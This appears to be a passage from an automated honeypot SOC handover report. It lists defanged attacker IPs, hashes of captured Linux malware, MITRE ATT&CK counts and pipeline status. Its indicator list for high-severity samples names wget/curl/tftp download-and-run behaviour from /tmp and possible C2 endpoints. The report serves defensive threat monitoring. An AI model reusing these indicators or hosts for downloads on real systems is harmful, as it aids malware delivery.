| `5.252.83[.]82` | 1 | 2026-07-16 05:55 | 2026-07-16 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]122` | 1 | 2026-07-16 07:51 | 2026-07-16 07:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-07-16 07:36 | 2026-07-16 07:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]121` | 1 | 2026-07-16 05:55 | 2026-07-16 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]97` | 1 | 2026-07-16 05:59 | 2026-07-16 05:59 | 9s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | 1 | 2026-07-16 08:41 | 2026-07-16 08:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-07-16 05:43 | 2026-07-16 05:43 | 31s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]9` | 1 | 2026-07-16 07:06 | 2026-07-16 07:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.244.74[.]228` | 1 | 2026-07-16 07:35 | 2026-07-16 07:37 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `122.187.227[.]145` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 50 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `36.135.62[.]103` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `34.79.58[.]59` | BE | Google LLC | **100** ⚠️ | 0 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `210.245.95[.]11` | VN | FPT Telecom Company | **100** ⚠️ | 50 |
| `136.56.34[.]147` | US | Google Fiber Inc. | **100** ⚠️ | 50 |
| `89.248.172[.]9` | NL | FiberXpress BV | **100** ⚠️ | 8 |
| `196.189.124[.]229` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `194.195.210[.]47` | US | Linode, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 151 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 140 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 11 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 9 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 9 |

---

## 🔕 False Positive Summary (67 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 19 below threshold 25 | 30 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 32 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 368 cases |
| Tool 34  | Credential Extractor        | ✅ 183 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 150 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 67 filtered (18.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 85 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 122 priority case(s) shown individually · 54 recon entry/entries in table (22 group(s) consolidating 147 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-16T10:14:17Z_
